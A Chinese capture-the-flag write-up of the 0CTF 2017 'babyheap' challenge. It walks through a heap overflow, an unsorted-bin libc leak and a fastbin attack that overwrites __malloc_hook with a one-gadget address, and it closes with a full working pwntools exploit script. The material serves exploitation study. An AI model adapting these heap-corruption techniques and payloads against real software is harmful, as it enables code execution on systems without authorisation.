## 前言

`2017 0ctfd的babyheap`    


入门的时候做到的不错的一道题，足够综合但又没有额外的难度限制使得我们可以自由的用刚学到的一些攻击手法，漏洞是我们很熟悉的溢出，虽然没有uaf和double free，但是后面的数据构造却用到了uaf和double free的思路，很适合做一段时间的堆学习的知识点的总结

## 分析
### 题目信息
glibc2.23版本，全保 

### 局部函数
#### 创建堆空间
```c
void __fastcall create(__int64 addr)
{
  int i; // [rsp+10h] [rbp-10h]
  int num; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )                    /* 优先分配到空的结构体里面，分配完一个就退出去 */
  {
    if ( !*(_DWORD *)(24LL * i + addr) )        /*  24为offeset，表明单个结构体size */
    {
      printf("Size: ");
      num = get_num();
      if ( num > 0 )
      {
        if ( num > 4096 )
          num = 4096;
        v3 = calloc(num, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + addr) = 1;       /*  flag */
        *(_QWORD *)(addr + 24LL * i + 8) = num;  /* heap size */
        *(_QWORD *)(addr + 24LL * i + 16) = v3;  /* heap ptr */
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

经典的用结构体管理堆空间，注释给出了成员变量，calloc分配空间(和malloc有什么区别还没学，后面补充)

#### 编辑内容
```c
__int64 __fastcall fill(__int64 addr)
{
  __int64 index; // rax
  int index1; // [rsp+18h] [rbp-8h]
  int size1; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  index = get_num();
  index1 = index;
  if ( (unsigned int)index <= 0xF )
  {
    index = *(unsigned int *)(24LL * (int)index + addr);
    if ( (_DWORD)index == 1 )
    {
      printf("Size: ");
      index = get_num();
      size1 = index;                            /*  自定义输入内容的size */
      if ( (int)index > 0 )
      {
        printf("Content: ");
        return read_input(*(_QWORD *)(24LL * index1 + addr + 16), size1);
      }
    }
  }
  return index;
}
```

很明显的漏洞，输入内容时第二个参数应该传入`*(_QWORD *)(24LL * index1 + addr + 8)`而不是用户输入的程度

其他函数看看就行，都是堆体很经典的菜单函数

## 思路
开了pie那么就要想办法泄露libc，此时就要想办法构造unsorted bin攻击(heap中目前只学了这一种泄露libc的方法)，因为可以任意构造数据，所以就想办法把fastbin ptr劫持到hook处打one gadget。但是因为这里把free的指针清空了所以需要再拿一个chunk ptr 指到我们构造的chunk处。所以实现步骤如下:
### unsorted bin attack
我们想得到一个在unsourced bin中的malloc chunk，当show chunk的内容时就泄露了main arena。

这里为了`绕检查方便` 先错开索引将一个chunk入到fastbin，再malloc出来修改size入到unsourced bins中，这样既解决了指针置空又达到了目的

具体实现:申请4个0x20的fast bin chunk,再申请一个unsourced bin chunk，根据heap的4kb对齐特性覆盖fast bin的末字节构造fake fd指向我们的unsourced bin chunk。再free或者malloc就行了
### fastbin attack
泄露出libc后我们去libc中找一块能过fastbin检查的内存(为了方便最好是在hook旁边)，把fd劫持过去再按fastbin的分配特性malloc回来就可以把hook写入one gadget了

实现:这里其实就是标准的板子了，根据自己申请的chunk调试下payload就行了

## 构造payload
### 简单的unsortedbin attack
```python
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)

free(1)
free(2)
```
申请两个free chunk来绕过double free的检查

```python
payload = p64(0)*3
payload += p64(0x21)
payload += p64(0)*3
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)
```
溢出修改fastbin的fd指针，让我们可以malloc到我们想要的chunk

```python
payload = p64(0)*3
payload += p64(0x21)
fill(3, payload)


alloc(0x10)
alloc(0x10)
```
依然是溢出修改我们想要malloc到的这个unsorted bin的size，绕过fast bin malloc的检查，然后申请回来。   

此时我们的第2个和第4个结构体的heap ptr都指向了我们的unsorted bin chunk

```python
payload = p64(0)*3
payload += p64(0x91)
fill(3, payload)


alloc(0x80)


free(4)
show(2)
```
把size改回去然后把这个chunk放到unsorted bin中，此时我们就有了一个在unsorted bin中的malloc chunk(因为第二个结构体还指向这个chunk捏)  

再打印这个chunk的内容就是main arena的地址了

### 准备arbitrary alloc

```python
alloc(0x60)
free(4)
payload = p64(libcbase_addr+0x3c4aed)  
fill(2, payload)

alloc(0x60)
alloc(0x60)

payload = 0x13 * b'a'  
payload += p64(libcbase_addr+0x4527a)
fill(6, payload)
```
再用一次上面的手法，用第二个chunk越界往第四个chunk的fd写`劫持的地址`，然后再把这个chunk申请回来往_malloc_hook上面写one gadget   

偏移`0x3c4aed`就是要劫持过去的地址(首先得确保绕过检查)，偏移`0x4527a`是one gadget地址
## 完整脚本
```python
from pwn import *
#context(os='linux', arch='mips',endian="little", log_level='debug')
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['tmux', 'sp', '-h']

# 启动方式----------------------------------------------------

file_name = "./alloc"
elf=ELF(file_name)
url = ""
port = 0

def debug(filename = file_name,b_slice=[],is_pie=0,is_start = 1):
    global p
    b_string = ""
    if is_pie:
        for i in b_slice:
            b_string += f"b *$rebase({i})\n"
    else:
        for i in b_slice:
            b_string += f"b *{hex(i)}\n"
    if is_start :
        p = gdb.debug(filename,b_string)
        return
    else:
        gdb.attach(p,b_string)
        pause()

b_examp=0xE7F

b_slice = [
    b_examp
]
p = process(file_name)
debug(b_slice = b_slice,is_pie=1,is_start=1) # 直接启动带pie


def alloc(size):
    p.recvuntil(b"Command: ")
    p.sendline(b"1")
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
def fill(idx, content):
    p.recvuntil(b"Command: ")
    p.sendline(b"2")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Size: ")
    p.sendline(str(len(content)).encode())
    p.recvuntil(b"Content: ")
    p.send(content)
def free(idx):
    p.recvuntil(b"Command: ")
    p.sendline(b"3")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
def show(idx):
    p.recvuntil(b"Command: ")
    p.sendline(b"4")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvline()
    return p.recvline()



alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)


free(1)
free(2)


payload = p64(0)*3
payload += p64(0x21)
payload += p64(0)*3
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)


payload = p64(0)*3
payload += p64(0x21)
fill(3, payload)


alloc(0x10)
alloc(0x10)


payload = p64(0)*3
payload += p64(0x91)
fill(3, payload)


alloc(0x80)


free(4)
show(2)

unsort_addr=u64(p.recv(8))
main_arena =unsort_addr-88
libcbase_addr =main_arena -0x3C4B20



alloc(0x60)


free(4)


payload = p64(libcbase_addr+0x3c4aed)  
fill(2, payload)


alloc(0x60)
alloc(0x60)


payload = 0x13 * b'a'
payload += p64(libcbase_addr+0x4527a)
fill(6, payload)


alloc(0x10)
p.interactive()
```